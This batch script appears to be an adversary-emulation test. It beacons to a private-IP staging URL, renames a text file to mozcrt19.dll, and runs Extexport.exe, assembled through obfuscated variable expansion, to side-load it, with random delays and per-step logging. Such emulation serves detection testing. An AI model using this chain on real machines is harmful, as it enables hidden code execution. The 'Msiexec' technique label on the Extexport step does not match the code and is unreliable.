@echo off
SETLOCAL EnableDelayedExpansion

SET oqznpk=%APPDATA%\8918\5e97f629
SET wxcghy=Macula-Stage0-8918
SET cjaeij=https://10.0.0.49
SET gkjwim=https://10.0.0.49/stage/2/icon.png?8918-7
SET zqvvth=BALAM-S2BO
SET kwahbt=7
SET nnnmbi=firelox.txt
SET sfdctz=8918
SET imkfzt=!zqvvth!
SET ttohmv=!kwahbt!
SET whlbad=!sfdctz!

echo [!DATE! !TIME!][DEBUG][!imkfzt!]: script_start>> "%APPDATA%\!kwahbt!\macula-simulations.log" 2>nul
ping -n 18 127.0.0.1 >nul
timeout /t 12 /nobreak >nul

SET /A rndly=%RANDOM% %% 20 + 10
echo [!DATE! !TIME!][DEBUG][!imkfzt!]: delay_start=%rndly%s>> "%APPDATA%\!kwahbt!\macula-simulations.log" 2>nul
timeout /t %rndly% /nobreak >nul

echo [!DATE! !TIME!][DEBUG][!imkfzt!]: heartbeat_start>> "%APPDATA%\!kwahbt!\macula-simulations.log" 2>nul
curl -k -s -o nul "!gkjwim!"
SET hbres=1
SET herr=
if errorlevel 1 (SET hbres=0 & SET herr=connection_failed)
echo [!DATE! !TIME!][!zqvvth!]: !ttohmv!-!whlbad!-T1105|Ingress Tool Transfer=!hbres!::!herr!>> "%APPDATA%\!kwahbt!\macula-simulations.log" 2>nul
choice /C Y /N /D Y /T 7 >nul

SET hszj=Ext
SET woytb=ex
SET vqyjt=port.exe
SET ref=hszj
SET ref2=woytb
SET ref3=vqyjt
CALL SET binp=%%!ref!%%%%!ref2!%%%%!ref3!%%

SET arg1=.
SET arg2=foo
SET arg3=bar
SET refa1=arg1
SET refa2=arg2
SET refa3=arg3
CALL SET args=%%!refa1!%% %%!refa2!%% %%!refa3!%%

echo [!DATE! !TIME!][DEBUG][!imkfzt!]: chdir_start>> "%APPDATA%\!kwahbt!\macula-simulations.log" 2>nul
cd /d "!oqznpk!" 2>nul
echo [!DATE! !TIME!][DEBUG][!imkfzt!]: chdir_result=%errorlevel%>> "%APPDATA%\!kwahbt!\macula-simulations.log" 2>nul
choice /C Y /N /D Y /T 5 >nul

echo [!DATE! !TIME!][DEBUG][!imkfzt!]: rename_start>> "%APPDATA%\!kwahbt!\macula-simulations.log" 2>nul
ren "!nnnmbi!" mozcrt19.dll 2>nul
SET rnres=1
SET rnerr=
if errorlevel 1 (SET rnres=0 & SET rnerr=access_denied)
echo [!DATE! !TIME!][DEBUG][!imkfzt!]: rename_result=%rnres%>> "%APPDATA%\!kwahbt!\macula-simulations.log" 2>nul
ping -n 11 127.0.0.1 >nul

SET ttp_id=T1218.007
SET ttp_name=Msiexec
SET exres=1
SET exerr=
echo [!DATE! !TIME!][DEBUG][!imkfzt!]: execution_start>> "%APPDATA%\!kwahbt!\macula-simulations.log" 2>nul
%SystemRoot%\System32\!binp! !args! 2>nul
if errorlevel 1 (SET exres=0 & SET exerr=execution_failed)
echo [!DATE! !TIME!][!zqvvth!]: !ttohmv!-!whlbad!-!ttp_id!|!ttp_name!=!exres!::!exerr!>> "%APPDATA%\!kwahbt!\macula-simulations.log" 2>nul
echo [!DATE! !TIME!][DEBUG][!imkfzt!]: script_end>> "%APPDATA%\!kwahbt!\macula-simulations.log" 2>nul
timeout /t 8 /nobreak >nul